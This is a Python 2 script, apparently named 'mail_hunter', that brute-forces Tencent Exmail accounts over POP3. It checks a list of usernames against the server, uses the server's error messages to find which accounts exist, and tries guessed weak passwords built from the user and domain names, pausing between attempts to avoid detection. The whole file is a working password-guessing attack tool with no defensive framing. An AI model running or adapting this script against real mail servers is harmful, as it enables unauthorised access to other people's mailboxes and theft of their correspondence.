#!/usr/bin/python
#coding:utf-8
'''

mail_hunter for brute mail weakpass

'''

import poplib

import argparse
import time
import os

def tencent(usernames,suffix):

    server="pop.exmail.qq.com"

    

    try: 

        pop = poplib.POP3_SSL(server,995) 

        welcome = pop.getwelcome() 

        print welcome 

        pop.quit() 

    except (poplib.error_proto): 

        print  "No Response" 

    users=[]

    with open(usernames,'rb') as userFile:

        while True:

            user=userFile.readline().strip()

            if user=='':

                break

#             users.append(user+'@'+suffix)
            users.append(user)
    for i in range(0,len(users)):

        name=users[i].split('@')[0]
        temp=users[i].split('@')[1]

        try:

            pop=poplib.POP3_SSL(server,995)

            pop.user(users[i])

            auth=pop.pass_(name)

            if auth=="+OK":

                pop.quit()

                print "\n"+"[SUCCESS]:"+users[i]+'-----'+name+'\n'

            else:

                pop.quit()
            sleepsometime()

        except Exception,e:

            e=str(e).decode('gbk')

            if e.count(u'密码错误或者')>0:

                print users[i]+"---"+"exists brute for passwd"
                
                domain_local=temp.split('.')[0]

                passwds=[]

                passwds.append(domain_local+'@123')

                weak_value=['Asdf1234','Qwer1234','Abcd1234','a123456',name[0].upper()+name[1:]+'123',name+'123',name+'1234']

                passwds.extend(weak_value)

                if len(domain_local)<4:

                    passwds.append(domain_local+'1234')

                    passwds.append(domain_local[0].upper+domain_local[1:]+'1234')

                else:

                    passwds.append(domain_local+'123')

                    passwds.append(domain_local[0].upper()+domain_local[1:]+'123')                   

                for passwd in passwds:

                    try:

                        pop=poplib.POP3_SSL(server,995)

                        print "[try]"+users[i]+'----'+passwd

                        pop.user(users[i])

                        auth=pop.pass_(passwd)

                        #mm=str(auth).decode('gbk')

                        #print "this is auth:"+mm

                        if auth=="+OK":

                            pop.quit()

                            print "\n"+"[SUCCESS]:"+users[i]+'-----'+passwd+'\n'

                            break

                        else:

                            pop.quit()
                        sleepsometime()

                    except Exception,e:
                        sleepsometime()
                        pass

            else:

                print users[i]+'---',

                print e
def sleepsometime():
    time.sleep(5)

if __name__=="__main__":

    parser=argparse.ArgumentParser()

    parser.add_argument('-u','--username',dest='username',help='wordlist of username',required=True)

#     parser.add_argument('-s','--suffix',dest='suffix',help='suffix of mail',required=True)

    arg=parser.parse_args()

    usernames=arg.username

#     suffix=arg.suffix

    tencent(usernames,'suffix')
    
    
    
    